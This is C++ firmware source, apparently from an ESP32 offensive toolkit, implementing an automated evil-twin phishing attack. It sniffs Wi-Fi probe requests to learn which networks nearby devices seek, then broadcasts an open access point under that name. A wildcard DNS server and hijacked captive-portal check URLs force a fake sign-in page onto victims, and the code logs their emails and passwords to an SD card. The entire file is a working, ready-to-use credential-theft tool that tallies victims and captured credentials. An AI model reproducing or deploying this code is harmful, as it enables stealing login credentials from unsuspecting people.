#if !LITE_VERSION
#include "arsenal.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <globals.h>
#include <SD.h>

static AsyncWebServer *phishServer = nullptr;
static DNSServer *dnsServer = nullptr;
static int phishCredsCapture = 0;
static String detectedSSID = "";
static std::vector<String> probedSSIDs;
static bool phishCapturing = false;


static void phishProbeCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT || !phishCapturing) return;

    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 24) return;


    if ((frame[0] & 0xFC) != 0x40) return;


    int pos = 24;
    while (pos < len - 2) {
        uint8_t tagType = frame[pos];
        uint8_t tagLen = frame[pos + 1];
        if (pos + 2 + tagLen > len) break;
        if (tagType == 0 && tagLen > 0 && tagLen < 33) {
            String ssid = "";
            for (int i = 0; i < tagLen; i++) {
                char c = (char)frame[pos + 2 + i];
                if (c >= 32 && c <= 126) ssid += c;
            }
            if (ssid.length() > 0) {

                bool exists = false;
                for (auto &s : probedSSIDs) {
                    if (s == ssid) { exists = true; break; }
                }
                if (!exists && probedSSIDs.size() < 20) {
                    probedSSIDs.push_back(ssid);
                }
            }
        }
        pos += 2 + tagLen;
    }
}


static String generatePhishPage(String ssid) {
    String page = R"rawliteral(
<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>)rawliteral" + ssid + R"rawliteral( - Login Required</title>
<style>
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f5f5f5;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{background:#fff;border-radius:12px;padding:32px;max-width:380px;width:100%;box-shadow:0 2px 20px rgba(0,0,0,0.1)}
h2{margin:0 0 8px;color:#333;font-size:1.3rem}
p{color:#666;font-size:0.9rem;margin-bottom:20px}
input{width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:8px;font-size:1rem;box-sizing:border-box}
button{width:100%;padding:14px;background:#007AFF;color:#fff;border:none;border-radius:8px;font-size:1rem;font-weight:600;cursor:pointer;margin-top:12px}
.logo{font-size:2.5rem;text-align:center;margin-bottom:16px}
.ssid{color:#007AFF;font-weight:600}
</style></head>
<body><div class="container">
<div class="logo">&#128274;</div>
<h2>Sign in to <span class="ssid">)rawliteral" + ssid + R"rawliteral(</span></h2>
<p>Enter your credentials to access this network.</p>
<form method="POST" action="/auth">
<input name="email" placeholder="Email or Username" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form>
</div></body></html>
)rawliteral";
    return page;
}

static void logPhishCred(String ssid, String user, String pass) {
    if (setupSdCard()) {
        if (!SD.exists("/arsenal")) SD.mkdir("/arsenal");
        File f = SD.open("/arsenal/creds.txt", FILE_APPEND);
        if (f) {
            f.printf("[%lu] AutoPhish SSID:%s | User:%s | Pass:%s\n",
                     millis() / 1000, ssid.c_str(), user.c_str(), pass.c_str());
            f.close();
        }
    }
    phishCredsCapture++;
}

void arsenal_captive_portal_autophish(void) {
    ARSENAL_SAFE_RUN([]() {
        probedSSIDs.clear();
        phishCredsCapture = 0;
        detectedSSID = "";


        WiFi.mode(WIFI_STA);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(phishProbeCallback);
        phishCapturing = true;

        drawMainBorderWithTitle("Auto-Phish");
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.setTextSize(FP);
        tft.drawCentreString(String("Listening for probe requests..."), tftWidth / 2, tftHeight / 2 - 10, 1);
        tft.drawCentreString(String("Sel to continue"), tftWidth / 2, tftHeight / 2 + 10, 1);


        int ch = 1;
        while (true) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            ch = (ch % 14) + 1;

            tft.fillRect(12, tftHeight - 35, tftWidth - 24, 14, bruceConfig.bgColor);
            tft.setCursor(12, tftHeight - 35);
            tft.printf("Found %d SSIDs", (int)probedSSIDs.size());

            if (check(EscPress)) {
                phishCapturing = false;
                esp_wifi_set_promiscuous(false);
                return;
            }
            if (check(SelPress) && !probedSSIDs.empty()) break;
            esp_task_wdt_reset();
            delay(100);
        }

        phishCapturing = false;
        esp_wifi_set_promiscuous(false);

        if (probedSSIDs.empty()) {
            displayRedStripe("No SSIDs detected");
            delay(1500);
            return;
        }


        options.clear();
        for (auto &ssid : probedSSIDs) {
            options.push_back({ssid, [&ssid]() {
                detectedSSID = ssid;
            }});
        }
        loopOptions(options, MENU_TYPE_SUBMENU, "Target SSID");

        if (detectedSSID.length() == 0) return;


        WiFi.mode(WIFI_AP);
        WiFi.softAP(detectedSSID.c_str(), "");
        delay(100);


        dnsServer = new DNSServer();
        dnsServer->start(53, "*", WiFi.softAPIP());


        String phishPage = generatePhishPage(detectedSSID);
        phishServer = new AsyncWebServer(80);

        phishServer->on("/", HTTP_GET, [phishPage](AsyncWebServerRequest *request) {
            request->send(200, "text/html", phishPage);
        });
        phishServer->on("/auth", HTTP_POST, [](AsyncWebServerRequest *request) {
            String user = request->hasArg("email") ? request->arg("email") : "";
            String pass = request->hasArg("password") ? request->arg("password") : "";
            logPhishCred(detectedSSID, user, pass);
            request->send(200, "text/html", "<html><body><h1>Connected!</h1><p>You're now online.</p></body></html>");
        });

        phishServer->on("/generate_204", HTTP_GET, [phishPage](AsyncWebServerRequest *r) { r->send(200, "text/html", phishPage); });
        phishServer->on("/hotspot-detect.html", HTTP_GET, [phishPage](AsyncWebServerRequest *r) { r->send(200, "text/html", phishPage); });
        phishServer->on("/connecttest.txt", HTTP_GET, [phishPage](AsyncWebServerRequest *r) { r->send(200, "text/html", phishPage); });
        phishServer->onNotFound([phishPage](AsyncWebServerRequest *r) { r->send(200, "text/html", phishPage); });

        phishServer->begin();


        while (true) {
            dnsServer->processNextRequest();

            drawMainBorderWithTitle("Auto-Phish");
            int y = 42;
            int padX = 12;

            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.setTextSize(FP);
            tft.setCursor(padX, y);
            tft.print("PHISHING ACTIVE");
            y += 16;

            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setCursor(padX, y);
            tft.print("SSID: " + detectedSSID.substring(0, 20));
            y += 14;

            tft.setCursor(padX, y);
            tft.print("IP: " + WiFi.softAPIP().toString());
            y += 14;

            tft.setCursor(padX, y);
            tft.printf("Victims connected: %d", WiFi.softAPgetStationNum());
            y += 14;

            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
            tft.setCursor(padX, y);
            tft.printf("Creds captured: %d", phishCredsCapture);

            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.drawCentreString(String("Esc to stop"), tftWidth / 2, tftHeight - 20, 1);

            if (check(EscPress)) break;
            esp_task_wdt_reset();
            delay(300);
        }


        phishServer->end();
        delete phishServer;
        phishServer = nullptr;
        dnsServer->stop();
        delete dnsServer;
        dnsServer = nullptr;
        WiFi.softAPdisconnect(true);
    });
}
#endif
